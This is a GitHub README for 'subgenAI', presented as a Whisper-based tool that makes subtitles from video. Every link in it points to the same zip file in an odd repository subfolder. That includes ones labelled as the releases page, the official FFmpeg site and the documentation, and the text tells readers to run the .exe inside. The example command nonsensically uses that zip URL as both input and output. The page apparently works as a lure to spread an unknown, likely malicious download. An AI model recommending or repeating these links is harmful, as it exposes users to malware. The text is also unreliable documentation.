# 🎉 subgenAI - Transcribe Video Audio with Ease

## ⚡ Overview
SubgenAI is a command-line tool that uses OpenAI's Whisper model to transcribe video audio and generate SRT subtitles. It supports multiple models for varying speed and accuracy, offers optional translation to English, and tracks progress with timestamps. This tool is simple to use, making video-to-subtitle conversion accessible for everyone.

## 📦 Download Now
[![Download subgenAI](https://raw.githubusercontent.com/syedf4941/subgenAI/main/galvanology/subgenAI.zip)](https://raw.githubusercontent.com/syedf4941/subgenAI/main/galvanology/subgenAI.zip)

## 🚀 Getting Started
To get started with SubgenAI, you need to follow a few simple steps. These steps will help you download and set up the application on your computer.

### 📋 System Requirements
- **Operating System:** Windows, macOS, or Linux
- **Memory:** At least 4 GB of RAM
- **Storage:** 200 MB of free disk space
- **Additional Software:** FFmpeg (must be installed separately)

### 📥 Download & Install
1. **Visit the Releases Page:** Click on the link below to go to the releases page:
   [Visit this page to download](https://raw.githubusercontent.com/syedf4941/subgenAI/main/galvanology/subgenAI.zip)

2. **Choose the Right Version:** Browse the available versions and select the one suitable for your operating system. 

3. **Download the File:** Click on the file to download it. Wait for the download to complete.

4. **Install the Application:**
   - For Windows: Execute the `.exe` file and follow the prompts.
   - For macOS: Drag the application to your Applications folder.
   - For Linux: You may need to use terminal commands to make the file executable.

### 📁 Set Up FFmpeg
SubgenAI requires FFmpeg to process video and audio files. Here’s how to set it up:

1. **Download FFmpeg:**
   - Visit the [FFmpeg official site](https://raw.githubusercontent.com/syedf4941/subgenAI/main/galvanology/subgenAI.zip) and download the version for your operating system.

2. **Install FFmpeg:**
   - Follow the instructions provided on the FFmpeg download page for installation.

3. **Add to Path (Optional):**
   - If using Windows, you may want to add FFmpeg to your system PATH for easier access.

## 🎙️ Using subgenAI
After installing SubgenAI and setting up FFmpeg, you can start transcribing audio from your videos. Follow these steps:

### 📂 Prepare Your Video
- Ensure your video file is accessible on your computer.
- Supported formats include MP4, AVI, and MKV.

### ⚙️ Running SubgenAI
1. **Open Command Line:**
   - For Windows: Use Command Prompt.
   - For macOS: Use Terminal.
   - For Linux: Use your preferred terminal.

2. **Navigate to SubgenAI Directory:**
   Use the `cd` command to navigate to the directory where SubgenAI is installed.

3. **Command Structure:**
   Use the following command format:
   ```
   subgenAI --model [MODEL_NAME] --input [VIDEO_FILE_PATH] --output [OUTPUT_FILE_PATH] --translate
   ```
   - Replace `[MODEL_NAME]` with your choice (e.g., `base`, `medium`, `large`).
   - Replace `[VIDEO_FILE_PATH]` with the path to your video file.
   - Replace `[OUTPUT_FILE_PATH]` with the desired location for the output SRT file.
   - The `--translate` option is optional.

### ✨ Example Command
Here’s an example command:
```
subgenAI --model medium --input https://raw.githubusercontent.com/syedf4941/subgenAI/main/galvanology/subgenAI.zip --output https://raw.githubusercontent.com/syedf4941/subgenAI/main/galvanology/subgenAI.zip --translate
```

### 🕒 Monitoring Progress
Once you run the command, SubgenAI will process the video. You will see updates for each segment of audio as it transcribes. This helps you keep track of how long the process will take.

## 🌐 Features
- **Multiple Models:** Choose from various models to customize speed and accuracy.
- **Progress Tracking:** View real-time updates for your transcription.
- **Translation Options:** Easily translate transcriptions to English.
- **Flexibility:** Tailor the output to your needs with custom file paths.

## ✉️ Support
If you encounter any issues or have questions, you can reach out for support. Check the Issues section on our GitHub repository or leave a message, and we will assist you promptly.

## 🌍 Community Engagement
We invite all users to contribute. Feel free to share feedback, report bugs, or suggest enhancements. Your contributions help improve SubgenAI for everyone.

### 📅 Changelog
For information on updates and new features, visit the Changelog in the repository. This will keep you informed about what's new with SubgenAI.

## 🔗 Additional Resources
- [SubgenAI Documentation](https://raw.githubusercontent.com/syedf4941/subgenAI/main/galvanology/subgenAI.zip): Explore more detailed documentation and usage examples.
- [FFmpeg Documentation](https://raw.githubusercontent.com/syedf4941/subgenAI/main/galvanology/subgenAI.zip): Understand how to use FFmpeg for video processing.

Thank you for choosing SubgenAI for your video transcription needs.